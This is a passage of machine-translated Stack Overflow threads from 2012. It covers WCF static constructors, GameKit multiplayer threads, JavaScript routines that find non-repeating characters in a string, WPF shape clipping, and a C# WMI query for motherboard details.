在构造函数中初始化的所有值都声明为静态的。

在`WebService`项目的情况下，它通过静态构造函数初始化所有静态变量。我已经通过保持这个静态构造函数的断点来验证它。它将命中所有静态构造函数，最后是我的 Web 服务的公共构造函数。

但这不会发生在`RESTWebService`. 所有环境都和我的一模一样`WebService`。但它没有命中静态构造函数的断点，而是直接命中了`RestWebService`公共构造函数。

这背后的原因是什么？我是 WCF 的新手。RESTWebService 还有什么其他的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T13:49:42.377

不要检查它是否通过断点调用 - 相反，当调用实例/服务方法时，检查值是否实际初始化。或者尝试从静态构造函数中记录一些东西，看看它是否被调用。

在您有机会对其进行调试/中断之前，可能会调用静态构造函数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T13:51:19.073

静态构造函数仍应被调用，但这将在宿主程序首次加载您的 DLL 时发生。

可能是主机（我猜是 IIS？）在您添加断点之前加载了服务。尝试 IISRESET 然后再次检查，您将需要附加到 iis 工作进程以进行调试。

# ios - 为什么iOS GameCenter多人实时对战每次都会创建新线程？

> ID：13841216
> 
> 赞同：1
> 
> 时间：2012-12-12T13:47:17.013
> 
> 标签：ios, game-center, multiplayer

我创建了非常简单的多人游戏应用程序，它只找到了比赛（只有 1 个对手）并在 5 秒内终止比赛：

```
-(void)matchmakerViewController:(GKMatchmakerViewController *)viewController 
                   didFindMatch:(GKMatch *)match {

    [self.presentingViewController dismissModalViewControllerAnimated:YES];

    self.match = match;
    self.match.delegate = self;

    if (!self.matchStarted && self.match.expectedPlayerCount == 0)
    {
        NSLog(@"Ready to start match!");
        //[self lookupPlayers];

        // My Own Test Code Begin

        if (!self.delegate) NSLog(@"No delegate on match invite.");

        // Notify delegate match can begin
        self.matchStarted = YES;
        [self.delegate matchStarted];

        // My Own Test Code End
    }
} 
```

AppDelegate 中的一些方法：

```
-(void)matchStarted
{
    CCLOG(@"Match started. Delay 5 seconds...");

    [self performSelector:@selector(matchEnded) withObject:nil afterDelay:5];
}

-(void)matchEnded
{
    CCLOG(@"Match ended");

    [[GameCenterMatchHelper sharedInstance].match disconnect];
    [GameCenterMatchHelper sharedInstance].match = nil;
} 
```

第一场比赛一切正常。但是当比赛结束时，还有 3 个额外的线程（我可以看到它们暂停执行）：

1.  线程 com.apple.gamekitservices.gcksession.recvproc
2.  线程 com.apple.gamekitservices.gcksession.sendproc
3.  线程 com.apple.gamekitservices.eventcallback.eventcbproc

如果我开始两场比赛 - 比赛结束后已经有 6 个（3 个和 3 个）线程。而它如此糟糕的主要原因 - 应用程序崩溃，就像所有玩家都断开连接一样。

我使用 iPod touch 4g 和 iPad 2 与最新的 iOS 6 进行测试。这些线程是在两个设备上创建的。

我认为这是因为我为 GCHelper 和所有委托使用了一个单例类，但我试图将委托提取到其他一次性使用的类 - 每次出现额外的线程时。

也许 smb 知道我该如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-19T11:41:06.600

```
I think this is helpful for you.

#import <Foundation/Foundation.h>
#import <GameKit/Gamekit.h>

@interface GCHelper : NSObject<GKMatchmakerViewControllerDelegate, GKMatchDelegate>
{
    BOOL isUserAuthenticated;

    UIViewController *presentingViewController;
    GKMatch *match;
    BOOL matchStarted;

    GKInvite *pendingInvite;
    NSArray *pendingPlayersToInvite;
    NSMutableDictionary *playersDict;

    NSString *MultiplayerID;
    NSData *MultiData;
    NSString *otherPlayerID;

    char AlertMessageBoxNo;

    BOOL isDataRecieved;
}

//variables

@property (assign, readonly) BOOL gameCenterAvailable;
@property (retain) UIViewController *presentingViewController;
@property (retain) GKMatch *match;
@property (retain) GKInvite *pendingInvite;
@property (retain) NSArray *pendingPlayersToInvite;
@property (retain) NSMutableDictionary *playersDict;

@property (retain) NSString *MultiplayerID;
@property (retain) NSData *MultiData;

-(NSString*)getOtherPlayerId;
-(void)setOtherPlayerId;
//Functions
+ (GCHelper *)sharedInstance;
-(BOOL)isGameCenterAvailable;
-(void)authenticationChanged;
-(void)authenticateLocalUser;

-(void)gameOver:(NSString*)message;

-(void)setDataRecieved:(BOOL)d;
-(BOOL)getDataRecieved;

- (void)findMatchWithMinPlayers:(int)minPlayers maxPlayers:(int)maxPlayers viewController:(UIViewController *)viewController;

@end

/////////

#import "GCHelper.h"
#import "IPadSharebleClass.h"

@implementation GCHelper

@synthesize gameCenterAvailable;
@synthesize presentingViewController;
@synthesize match;
@synthesize pendingInvite;
@synthesize pendingPlayersToInvite;
@synthesize playersDict;
@synthesize MultiData;
@synthesize MultiplayerID;

static GCHelper *sharedHelper = nil;

+(GCHelper *) sharedInstance
{
    if (!sharedHelper)
    {
        sharedHelper = [[GCHelper alloc] init];
    }
    return sharedHelper;
}

- (BOOL)isGameCenterAvailable
{
    Class gcClass = (NSClassFromString(@"GKLocalPlayer"));
    NSString *reqSysVer = @"4.1";
    NSString *currSysVer = [[UIDevice currentDevice] systemVersion];
    BOOL osVersionSupported = ([currSysVer compare:reqSysVer options:NSNumericSearch] != NSOrderedAscending);
    return (gcClass && osVersionSupported);
}

- (id)init
{
    if ((self = [super init]))
    {
        gameCenterAvailable = [self isGameCenterAvailable];
        if (gameCenterAvailable)
        {
            NSNotificationCenter *nc =
            [NSNotificationCenter defaultCenter];
            [nc addObserver:self
                   selector:@selector(authenticationChanged)
                       name:GKPlayerAuthenticationDidChangeNotificationName
                     object:nil];
        }
        else
        {
            UIAlertView* alert=[[UIAlertView alloc]initWithTitle:@"Game Center Alert" message:@"Game Center Not Available" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil, nil];
            [alert show];
            [alert release];
        }
    }
    return self;
}

-(void)authenticationChanged
{
    if ([GKLocalPlayer localPlayer].isAuthenticated && !isUserAuthenticated)
    {
        NSLog(@"Authentication changed: player authenticated.");
        isUserAuthenticated = TRUE;

        [GKMatchmaker sharedMatchmaker].inviteHandler = ^(GKInvite *acceptedInvite, NSArray *playersToInvite)
        {
            NSLog(@"Received invite");
            self.pendingInvite = acceptedInvite;
            self.pendingPlayersToInvite = playersToInvite;
            IPadCallAnyWhereF.inviteReceived();
        };

    }
    else if (![GKLocalPlayer localPlayer].isAuthenticated && isUserAuthenticated)
    {
        NSLog(@"Authentication changed: player not authenticated");
        isUserAuthenticated = FALSE;
    }

}

- (void)authenticateLocalUser
{
    if (!gameCenterAvailable) return;

    NSLog(@"Authenticating local user...");
    if ([GKLocalPlayer localPlayer].authenticated == NO)
    {
        [[GKLocalPlayer localPlayer] authenticateWithCompletionHandler:nil];
    }
    else
    {
        NSLog(@"Already authenticated!");
    }
}

-(void)findMatchWithMinPlayers:(int)minPlayers maxPlayers:(int)maxPlayers viewController:(UIViewController *)viewController
{
    if (!gameCenterAvailable) return;

    matchStarted = NO;
    self.match = nil;
    self.presentingViewController = viewController;
    if (pendingInvite != nil)
    {
        [presentingViewController dismissModalViewControllerAnimated:NO];
        GKMatchmakerViewController *mmvc = [[[GKMatchmakerViewController alloc] initWithInvite:pendingInvite] autorelease];
        mmvc.matchmakerDelegate = self;
        [presentingViewController presentModalViewController:mmvc animated:YES];

        self.pendingInvite = nil;
        self.pendingPlayersToInvite = nil;
    }
    else
    {
        [presentingViewController dismissModalViewControllerAnimated:NO];
        GKMatchRequest *request = [[[GKMatchRequest alloc] init] autorelease];
        request.minPlayers = minPlayers;
        request.maxPlayers = maxPlayers;
        request.playersToInvite = pendingPlayersToInvite;

        GKMatchmakerViewController *mmvc = [[[GKMatchmakerViewController alloc] initWithMatchRequest:request] autorelease];
        mmvc.matchmakerDelegate = self;

        [presentingViewController presentModalViewController:mmvc animated:YES];

        self.pendingInvite = nil;
        self.pendingPlayersToInvite = nil;

    }

}

#pragma mark GKMatchmakerViewControllerDelegate
- (void)matchmakerViewControllerWasCancelled:(GKMatchmakerViewController *)viewController
{
    [presentingViewController dismissModalViewControllerAnimated:YES];

    UIAlertView* alert=[[UIAlertView alloc]initWithTitle:@"Game Center Alert" message:@"Game Cancel By you" delegate:self cancelButtonTitle:@"Try Again" otherButtonTitles:@"Main Menu", nil];
    [alert show];
    [alert release];
    AlertMessageBoxNo='E';
}

- (void)matchmakerViewController:(GKMatchmakerViewController *)viewController didFailWithError:(NSError *)error
{
    [presentingViewController dismissModalViewControllerAnimated:YES];
    NSLog(@"Error finding match: %@", error.localizedDescription);
    UIAlertView* alert=[[UIAlertView alloc]initWithTitle:@"Game Center Alert" message:@"Connection Time out" delegate:self cancelButtonTitle:@"Try Again" otherButtonTitles:@"Main Menu", nil];
    [alert show];
    [alert release];
    AlertMessageBoxNo='A';
}

- (void)matchmakerViewController:(GKMatchmakerViewController *)viewController didFindMatch:(GKMatch *)theMatch
{
    [presentingViewController dismissModalViewControllerAnimated:YES];
    self.match = theMatch;
    match.delegate = self;
    if (!matchStarted && match.expectedPlayerCount == 0)
    {
        NSLog(@"***************Ready to start match!**************");
        [self lookupPlayers];
    }
}

- (void)lookupPlayers
{
    NSLog(@"Looking up %d players...", match.playerIDs.count);
    [GKPlayer loadPlayersForIdentifiers:match.playerIDs withCompletionHandler:^(NSArray *players, NSError *error)
     {
         if (error != nil)
         {
             NSLog(@"Error retrieving player info: %@", error.localizedDescription);
             matchStarted = NO;
             //IPadCallAnyWhereF.matchEnded();
             UIAlertView* alert=[[UIAlertView alloc]initWithTitle:@"Game Center Alert" message:@"Error retrieving player info" delegate:self cancelButtonTitle:@"Try Again" otherButtonTitles:@"Main Menu", nil];
             [alert show];
             [alert release];
             AlertMessageBoxNo='F';
         }
         else
         {
             self.playersDict = [NSMutableDictionary dictionaryWithCapacity:players.count];
             for (GKPlayer *player in players)
             {
                 NSLog(@"Found player: %@", player.alias);
                 [playersDict setObject:player forKey:player.playerID];
             }
             NSLog(@"Total Number of Players : %d",players.count);
             matchStarted = YES;
             IPadCallAnyWhereF.matchStarted();
         }
     }];

}

#pragma mark GKMatchDelegate
- (void)match:(GKMatch *)theMatch didReceiveData:(NSData *)data fromPlayer:(NSString *)playerID
{
    if (match != theMatch) return;

    MultiData=data;
    MultiplayerID=playerID;
    if(otherPlayerID==nil)
    {
        otherPlayerID=[playerID retain];
    }
    IPadCallAnyWhereF.match();
}

-(void)setDataRecieved:(BOOL)d
{
    isDataRecieved=d;
}
-(BOOL)getDataRecieved
{
    return isDataRecieved;
}

-(NSString*)getOtherPlayerId
{
    return otherPlayerID;
}

-(void)setOtherPlayerId
{
    otherPlayerID=nil;
}

- (void)match:(GKMatch *)theMatch player:(NSString *)playerID didChangeState:(GKPlayerConnectionState)state
{
    if (match != theMatch) return;
    switch (state)
    {
        case GKPlayerStateConnected:
            NSLog(@"New Player connected!");
            if (!matchStarted && theMatch.expectedPlayerCount == 0)
            {
                NSLog(@"&&&&&&&&&& Ready to start match in the match!");
                [self lookupPlayers];
            }
            break;
        case GKPlayerStateDisconnected:
            NSLog(@"--------Player disconnected!--------");
            matchStarted = NO;
            UIAlertView* alert=[[UIAlertView alloc]initWithTitle:@"Game Center Alert" message:@"Player Disconnected" delegate:self cancelButtonTitle:@"Try Again" otherButtonTitles:@"Main Menu", nil];
            [alert show];
            [alert release];
            AlertMessageBoxNo='B';
            //IPadCallAnyWhereF.matchDisconnect();
            break;
    }
}

- (void)match:(GKMatch *)theMatch connectionWithPlayerFailed:(NSString *)playerID withError:(NSError *)error
{
    if (match != theMatch) return;

    NSLog(@"Failed to connect to player with error: %@", error.localizedDescription);
    matchStarted = NO;
    //IPadCallAnyWhereF.matchEnded();
    UIAlertView* alert=[[UIAlertView alloc]initWithTitle:@"Game Center Alert" message:@"Failed to connect to player" delegate:self cancelButtonTitle:@"Try Again" otherButtonTitles:@"Main Menu", nil];
    [alert show];
    [alert release];
    AlertMessageBoxNo='C';

}

- (void)match:(GKMatch *)theMatch didFailWithError:(NSError *)error
{
    if (match != theMatch) return;

    NSLog(@"Match failed with error: %@", error.localizedDescription);
    matchStarted = NO;
    //IPadCallAnyWhereF.matchEnded();
    UIAlertView* alert=[[UIAlertView alloc]initWithTitle:@"Game Center Alert" message:@"Match failed" delegate:self cancelButtonTitle:@"Try Again" otherButtonTitles:@"Main Menu", nil];
    [alert show];
    [alert release];
    AlertMessageBoxNo='D';

}

-(void)gameOver:(NSString*)message
{
    UIAlertView* alert=[[UIAlertView alloc]initWithTitle:@"Game Center Alert" message:message delegate:self cancelButtonTitle:@"Try Again" otherButtonTitles:@"Main Menu", nil];
    [alert show];
    [alert release];
    AlertMessageBoxNo='G';
}

-(void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex
{
    NSString *title = [alertView buttonTitleAtIndex:buttonIndex];

    if([title isEqualToString:@"Try Again"])
    {
        IPadCallAnyWhereF.matchDisconnect();
    }
    else if([title isEqualToString:@"Main Menu"])
    {
        IPadCallAnyWhereF.gotoMainMenu();
    }

}

@end 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-21T10:37:01.403

正确的答案是 XCode 没有显示真实的线程图片。它显示了很多不同的线程，但如果我尝试在分析器中查看它们，那么我知道没有其他线程。所以我应该建议，线程没有问题，但调试过程有问题。作为一个主题启动器，我认为它已经关闭。谢谢你们。

# javascript - 查找字符串中不重复的字符

> ID：13841217
> 
> 赞同：14
> 
> 时间：2012-12-12T13:47:18.170
> 
> 标签：javascript, string, duplicates

我必须在 JavaScript 中创建一个函数来删除字符串中所有重复的字母。到目前为止，我已经能够做到这一点：如果我有“anaconda”这个词，它会在应该显示“cod”时显示“anaconda”作为结果。这是我的代码：

```
function find_unique_characters( string ){
    var unique='';
    for(var i=0; i<string.length; i++){
        if(unique.indexOf(string[i])==-1){
            unique += string[i];
        }
    }
    return unique;
}
console.log(find_unique_characters('baraban')); 
```

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2016-03-13T23:20:17.503

我们现在还可以使用过滤器方法清理内容：

```
function removeDuplicateCharacters(string) {
  return string
    .split('')
    .filter(function(item, pos, self) {
      return self.indexOf(item) == pos;
    })
    .join('');
}
console.log(removeDuplicateCharacters('baraban')); 
```

[工作示例](https://jsfiddle.net/masterspambot/ppz6uec1/)：

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2012-12-12T13:52:46.537

```
function find_unique_characters(str) {
  var unique = '';
  for (var i = 0; i < str.length; i++) {
    if (str.lastIndexOf(str[i]) == str.indexOf(str[i])) {
      unique += str[i];
    }
  }
  return unique;
}

console.log(find_unique_characters('baraban'));
console.log(find_unique_characters('anaconda'));
```

如果您只想返回在字符串中出现一次的字符，请检查它们的最后一次出现是否与第一次出现在同一位置。

您的代码至少返回一次字符串中的所有字符，而不是只返回出现不超过一次的字符。[但显然你已经知道了，否则就不会有问题了;-)]

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-08-23T15:47:04.527

只是想添加我的解决方案以获得乐趣：

```
function removeDoubles(string) {
  var mapping = {};
  var newString = '';

  for (var i = 0; i < string.length; i++) {
    if (!(string[i] in mapping)) {
      newString += string[i];
      mapping[string[i]] = true;
    }
  }
  return newString;
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2019-06-29T15:17:22.323

您可以将字符作为要删除的参数作为唯一参数

```
function find_unique_characters(str, char){
  return [...new Set(str.split(char))].join(char);
} 
```

```
function find_unique_characters(str, char){
  return [...new Set(str.split(char))].join(char);
}

let result = find_unique_characters("aaaha ok yet?", "a");
console.log(result);
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2016-11-14T15:00:11.463

使用[lodash](https://lodash.com/docs/4.17.0#uniq)：

```
_.uniq('baraban').join(''); // returns 'barn' 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2016-09-29T03:40:24.977

```
 //One simple way to remove redundecy of Char in String
       var char = "aaavsvvssff"; //Input string
       var rst=char.charAt(0);
       for(var i=1;i<char.length;i++){              
           var isExist = rst.search(char.charAt(i));
            isExist >=0 ?0:(rst +=  char.charAt(i) ); 
       }
       console.log(JSON.stringify(rst)); //output string : avsf 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2019-04-15T08:11:07.613

使用集合：

```
removeDuplicates = str => [...new Set(str)].join(''); 
```

感谢下面的大卫评论。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2020-01-16T15:45:25.003

对于字符串（一行）

`removeDuplicatesStr = str => [...new Set(str)].join('');`

对于数组（一行）

`removeDuplicatesArr = arr => [...new Set(arr)]`

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-12-12T14:50:51.933

[演示](http://jsfiddle.net/mplungjan/YUXVF/)

```
function find_unique_characters( string ){
    unique=[];
    while(string.length>0){
        var char = string.charAt(0);
        var re = new RegExp(char,"g");
        if (string.match(re).length===1) unique.push(char);
        string=string.replace(re,"");
    }        
    return unique.join("");
}
console.log(find_unique_characters('baraban')); // rn
console.log(find_unique_characters('anaconda')); //cod
​ 
```

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2019-09-11T13:09:05.990

使用`Set()`和解构两次更短：

```
const str = 'aaaaaaaabbbbbbbbbbbbbcdeeeeefggggg';

const unique = [...new Set([...str])].join('');

console.log(unique);
```

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2017-09-28T07:01:34.177

```
var str = 'anaconda'.split('');
var rmDup = str.filter(function(val, i, str){
     return str.lastIndexOf(val) === str.indexOf(val);
});
console.log(rmDup); //prints ["c", "o", "d"] 
```

请在此处验证：[https ://jsfiddle.net/jmgy8eg9/1/](https://jsfiddle.net/jmgy8eg9/1/)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2014-12-11T18:22:32.307

Here's what I used - haven't tested it for spaces or special characters, but should work fine for pure strings:

```
function uniquereduce(instring){ 
    outstring = ''
    instringarray = instring.split('')
    used = {}
    for (var i = 0; i < instringarray.length; i++) {
        if(!used[instringarray[i]]){
            used[instringarray[i]] = true
            outstring += instringarray[i]
        }
    }
    return outstring
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2012-12-12T14:00:16.230

删除所有出现多次的字母的另一种方法：

```
function find_unique_characters( string ) {
    var mapping = {};
    for(var i = 0; i < string.length; i++) {
        var letter = string[i].toString();
        mapping[letter] = mapping[letter] + 1 || 1;
    }
    var unique = '';
    for (var letter in mapping) {
        if (mapping[letter] === 1)
            unique += letter;
    }

    return unique;
} 
```

[现场测试用例](http://jsfiddle.net/TuJbH/1/)。

解释：你循环遍历字符串中的所有字符，将每个字符映射到它在字符串中出现的次数。然后你遍历项目（出现在字符串中的字母）并只选择那些只出现一次的项目。

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2012-12-12T14:02:32.197

```
function removeDup(str) {
  var arOut = [];
  for (var i=0; i < str.length; i++) {
    var c = str.charAt(i);
    if (c === '_') continue;
    if (str.indexOf(c, i+1) === -1) {
      arOut.push(c);
    }
    else {
      var rx = new RegExp(c, "g");
      str = str.replace(rx, '_');
    }
  }
  return arOut.join('');
} 
```

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2013-06-21T15:34:15.440

这段代码对我有用，可以从字符串中删除重复的（重复的）字符（即使它的单词用空格分隔）

链接：[工作示例 JSFiddle](http://jsfiddle.net/bpfVU/8/)

```
/* This assumes you have trim the string and checked if it empty */
function RemoveDuplicateChars(str) {
   var curr_index = 0;
   var curr_char;
   var strSplit;
   var found_first;
   while (curr_char != '') {
      curr_char = str.charAt(curr_index);
      /* Ignore spaces */
      if (curr_char == ' ') {
         curr_index++;
         continue;
      }
      strSplit = str.split('');
      found_first = false;
      for (var i=0;i<strSplit.length;i++) {
         if(str.charAt(i) == curr_char && !found_first) 
            found_first = true;
         else if (str.charAt(i) == curr_char && found_first) {
            /* Remove it from the string */
            str = setCharAt(str,i,'');
         }
      }
      curr_index++;
   }
   return str;
}
function setCharAt(str,index,chr) {
    if(index > str.length-1) return str;
    return str.substr(0,index) + chr + str.substr(index+1);
} 
```

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2012-12-12T13:58:30.477

我有 FF/Chrome，它适用于：

```
var h={}; 
"anaconda".split("").
  map(function(c){h[c] |= 0; h[c]++; return c}).
  filter(function(c){return h[c] == 1}).
  join("") 
```

如果您编写如下函数，则可以重用它：

```
function nonRepeaters(s) {
  var h={}; 
  return s.split("").
    map(function(c){h[c] |= 0; h[c]++; return c}).
    filter(function(c){return h[c] == 1}).
    join("");
 } 
```

对于缺少 等的旧浏览器`map`，`filter`我猜它可以通过 jQuery 或原型来模拟...

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2019-12-10T10:38:46.920

**方法1：**一种简单的方法，只包含JS-函数

```
var data = 'sssssddddddddddfffffff';

    var ary = [];
    var item = '';
    for (const index in data) {
      if (!ary.includes(data[index])) {
        ary[index] = data[index];
        item += data[index];
      }
    }
    console.log(item); 
```

**方法 2：**是的，我们可以在**不使用 JavaScript 函数**的情况下实现这一点：

```
var name = 'sssssddddddddddfffffff';

let i = 0;
let newarry = [];

for (let singlestr of name) {
    newarry[i] = singlestr;
    i++;
}

// now we have new Array and length of string
length = i;

function getLocation(recArray, item, arrayLength) {

    firstLaction = -1;
    for (let i = 0; i < arrayLength; i++) {

        if (recArray[i] === item) {
            firstLaction = i;
            break;
        }

    }

    return firstLaction;

}

let finalString = '';
for (let b = 0; b < length; b++) {

    const result = getLocation(newarry, newarry[b], length);
    if (result === b) {
        finalString += newarry[b];
    }

}
console.log(finalString); // sdf 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2019-05-25T13:18:12.383

1.  如果您希望您的函数只在参数中返回一组独特的字符，那么这段代码可能会派上用场。在这里，您还可以检查记录在“nonUnique”标题数组中的非唯一值：

    ```
    function remDups(str){
        if(!str.length)
            return '';
        var obj = {};
        var unique = [];
        var notUnique = [];
        for(var i = 0; i < str.length; i++){
            obj[str[i]] = (obj[str[i]] || 0) + 1;
        }
        Object.keys(obj).filter(function(el,ind){
            if(obj[el] === 1){
                unique+=el;
            }
            else if(obj[el] > 1){
                notUnique+=el;
            }
        });
    return unique;
    }
    console.log(remDups('anaconda')); //prints 'cod' 
    ```

2.  如果你想返回在传递的字符串中只出现一次的字符集，下面的代码可能会派上用场：

    ```
    function remDups(str){
        if(!str.length)
            return '';
        var s = str.split('');
        var obj = {};
        for(var i = 0; i < s.length; i++){
            obj[s[i]] = (obj[s[i]] || 0) + 1;
        }
        return Object.keys(obj).join('');
    }
    console.log(remDups('anaconda')); //prints 'ancod' 
    ```

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2016-08-08T16:15:05.457

刚刚遇到一个类似的问题（查找重复项）。本质上，使用散列来跟踪字符出现计数，并使用“一击奇迹”构建一个新字符串：

```
function oneHitWonders(input) {
    var a = input.split('');
    var l = a.length;
    var i = 0;
    var h = {};
    var r = "";

    while (i < l) {
        h[a[i]] = (h[a[i]] || 0) + 1;

        i += 1;
    }

    for (var c in h) {
        if (h[c] === 1) {
            r += c;
        }
    }

    return r;
} 
```

**用法**：

```
var a = "anaconda";
var b = oneHitWonders(a); // b === "cod" 
```

* * *

## 回答 #20

> 赞同：0
> 
> 时间：2017-09-19T19:55:07.027

这应该使用 Regex 工作；
注意：实际上，我不知道这个正则表达式是如何工作的，但我知道它的“速记”，所以，我会更好地向你解释这个的含义`/(.+)(?=.*?\1)/g;`。这个正则表达式只将数组中的重复字符返回给我，所以我遍历它以获得重复字符的长度。但这不适用于特殊字符，`"#" "_" "-",`但它会给你预期的结果；包括那些特殊字符`if any`

```
function removeDuplicates(str){
    var REPEATED_CHARS_REGEX = /(.+)(?=.*?\1)/g;
    var  res = str.match(REPEATED_CHARS_REGEX);
    var word = res.slice(0,1);
    var raw = res.slice(1);
    var together = new String (word+raw);
    var fer = together.toString();
    var length = fer.length;
    // my sorted duplicate;
      var result = '';
      for(var i = 0; i < str.length; i++) {
        if(result.indexOf(str[i]) < 0) {
          result += str[i];
        }
      }

      return {uniques: result,duplicates: length};
    } removeDuplicates('anaconda') 
```

正则表达式`/([a-zA-Z])\1+$/`正在寻找：

`([a-zA-Z]])`- 它在第一组中捕获的一封信；然后 `\1+`- 紧随其后的是该信件的一份或多份副本；然后 `$`- 字符串的结尾。将其更改为`/([a-zA-Z]).*?\1/`搜索：

`([a-zA-Z])`- 它在第一组中捕获的一封信；then `.*?`- 零个或多个字符（? 表示尽可能少）；直到 `\1`- 它找到第一个匹配字符的重复。

* * *

## 回答 #21

> 赞同：0
> 
> 时间：2019-11-06T10:03:20.883

```
console.log(("anaconda").split('').sort().join('').replace(/(.)\1+/g, "")); 
```

这样，您可以在一行中完成。

输出：'cdo'

* * *

## 回答 #22

> 赞同：0
> 
> 时间：2019-06-02T14:06:27.570

```
 function removeDuplicates(str) {
       var result = "";
       var freq = {};
       for(i=0;i<str.length;i++){
        let char = str[i];
        if(freq[char]) {
          freq[char]++;     
        } else {
           freq[char] =1
           result +=char;
       }
    }
  return result;
} 
```

* * *

## 回答 #23

> 赞同：0
> 
> 时间：2019-04-17T01:19:57.420

删除函数复制（str）{

```
let map = new Map();
// n 
for (let i = 0; i < str.length; i++) {
    if (map.has(str[i])) {
        map.set(str[i], map.get(str[i]) + 1);
    } else {
        map.set(str[i], 1);
    }

}

let res = '';

for (let i = 0; i < str.length; i++) {
    if (map.get(str[i]) === 1) {
        res += str[i];
    }
}

// o (2n) - > O(n)

// space o(n)

return res; 
```

}

* * *

## 回答 #24

> 赞同：0
> 
> 时间：2018-04-06T15:43:44.927

我对此有 3 种无环的单线方法。

**方法 1** - 删除重复项，并保留原始字符顺序：

```
var str = "anaconda";
var newstr = str.replace(new RegExp("[^"+str.split("").sort().join("").replace(/(.)\1+/g, "").replace(/[.?*+^$[\]\\(){}|-]/g, "\\$&")+"]","g"),"");
//cod 
```

**方法 2** - 删除重复但不保留字符顺序，但可能比方法 1 更快，因为它使用较少的正则表达式：

```
var str = "anaconda";
var newstr = str.split("").sort().join("").replace(/(.)\1+/g, "");
//cdo 
```

**方法 3** - 删除重复项，但保留唯一值（也不保留字符顺序）：

```
var str = "anaconda";
var newstr = str.split("").sort().join("").replace(/(.)(?=.*\1)/g, "");
//acdno 
```

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2017-06-17T20:23:07.903

试试这个代码，它可以工作:)

```
var str="anaconda";
Array.prototype.map.call(str, 
 (obj,i)=>{
  if(str.indexOf(obj,i+1)==-1 && str.lastIndexOf(obj,i-1)==-1){
   return obj;
  }
 }
).join("");
//output: "cod" 
```

* * *

## 回答 #26

> 赞同：0
> 
> 时间：2019-11-28T04:07:47.933

```
 function removeDuplicates(string){
      return string.split('').filter((item, pos, self)=> self.indexOf(item) == pos).join('');
   } 
```

过滤器将删除在使用项目索引和当前元素位置之前看到的所有字符

* * *

## 回答 #27

> 赞同：0
> 
> 时间：2021-05-05T13:57:34.893

```
// Try this way 

const str = 'anaconda';
const printUniqueChar = str => {
   const strArr = str.split("");
   const uniqueArray = strArr.filter(el => {
      return strArr.indexOf(el) === strArr.lastIndexOf(el);
   });
   return uniqueArray.join("");
};
console.log(printUniqueChar(str)); // output-> cod 
```

* * *

## 回答 #28

> 赞同：-1
> 
> 时间：2016-02-21T12:31:18.173

```
 function RemDuplchar(str)
{
    var index={},uniq='',i=0;
    while(i<str.length)
    {
        if (!index[str[i]])
        {
         index[str[i]]=true;
         uniq=uniq+str[i];
        }
            i++;
    }
    return uniq;
} 
```

* * *

## 回答 #29

> 赞同：-1
> 
> 时间：2016-03-22T09:06:44.457

我们可以使用循环删除字符串中的重复或相似元素，`for`并提取字符串方法，如`slice`, `substring`,`substr`

例如，如果要删除重复元素，例如`aababbafabbb`：

```
var data = document.getElementById("id").value
for(var i = 0; i < data.length; i++)
{
    for(var j = i + 1; j < data.length; j++)
    {
        if(data.charAt(i)==data.charAt(j))
        {
            data = data.substring(0, j) + data.substring(j + 1);
            j = j - 1;
            console.log(data);
        }
    }
} 
```

如果您想了解更多信息，请告诉我。

# wpf - 形状剪裁

> ID：13841218
> 
> 赞同：1
> 
> 时间：2012-12-12T13:47:19.663
> 
> 标签：wpf, vb.net, shapes, ellipse

我遇到了一个让我发疯几个小时的问题......

情况：我正在绘制一个形状 - 椭圆，然后我创建一个新画笔 - 从图像中，我将画笔应用于我的形状，然后我旋转形状..

问题是：Everthying 显示正确 - 但是......

一旦我将形状拖到窗口的边缘 - 这是公式结束的地方，它开始切割形状的某些部分。

它根本没有绘制不应该看到的部分，因为溢出了表格。但就我而言，我已经旋转了形状，所以它切割了错误的部分。

![在此处输入图像描述](../Images/f2007860cd1a3d4cc426a19f8ffb9b08.png) ![在此处输入图像描述](../Images/47ab7ac60e2e0651868c124c2158df1b.png)

这就是它的样子。有没有办法“重置”剪辑……或其他解决方案……

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T14:07:28.297

解决了。将父元素的宽度和高度设置为大于之前的窗口（它是 Horizo​​ntalAlignment.Stretch）。

现在你永远不会到达父母的剪裁边缘

# motherboard - Windows API 获取主板型号和名称

> ID：13841224
> 
> 赞同：1
> 
> 时间：2012-12-12T13:47:53.277
> 
> 标签：motherboard

我正在 Windows 上编写一个应用程序来获取主板的信息。我要收集的信息是

*   主板制造商（例如戴尔或技嘉）
*   主板型号（例如 T3600 或 GA-Z77）

谁能告诉我应该使用哪个 API 来获取这些信息？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-22T18:05:59.070

这是第一个答案，感谢您对该网站的感谢，首先将 System.Management 引用添加到您的项目并尝试此操作

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management;

namespace ConsoleApplication2
{
    class Program
    {
        static void Main(string[] args)
        {
            // First we create the ManagementObjectSearcher that
            // will hold the query used.
            // The class Win32_BaseBoard (you can say table)
            // contains the Motherboard information.
            // We are querying about the properties (columns)
            // Product and SerialNumber.
            // You can replace these properties by
